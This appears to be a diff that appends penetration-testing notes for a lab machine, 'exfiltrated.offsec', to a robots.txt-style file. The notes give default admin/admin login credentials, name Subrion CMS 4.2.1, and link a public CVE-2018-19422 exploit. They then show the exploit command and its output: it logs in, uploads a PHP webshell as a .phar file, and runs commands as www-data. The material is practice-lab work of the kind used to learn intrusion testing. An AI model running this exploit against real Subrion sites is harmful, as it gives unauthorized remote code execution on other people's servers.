@@ -30,3 +30,32 @@ Disallow: /panel/
 Disallow: /tmp/
 Disallow: /updates/
 
+http://exfiltrated.offsec/panel/
+username admin password admin
+
+Subrion version 4.2.1 
+
+https://github.com/h3v0x/CVE-2018-19422-SubrionCMS-RCE
+
+sudo python3 SubrionRCE.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
+[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
+
+[+] Trying to connect to: http://exfiltrated.offsec/panel/
+[+] Success!
+[+] Got CSRF token: 1THmGBw9xbVqGDfEv0q9fqfmxeEr5RjY3plZs3eY
+[+] Trying to log in...
+[+] Login Successful!
+
+[+] Generating random name for Webshell...
+[+] Generated webshell name: jqypkdylymhgane
+
+[+] Trying to Upload Webshell..
+[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/jqypkdylymhgane.phar 
+
+$ ls
+jqypkdylymhgane.phar
+
+$ whoami
+www-data
+
+
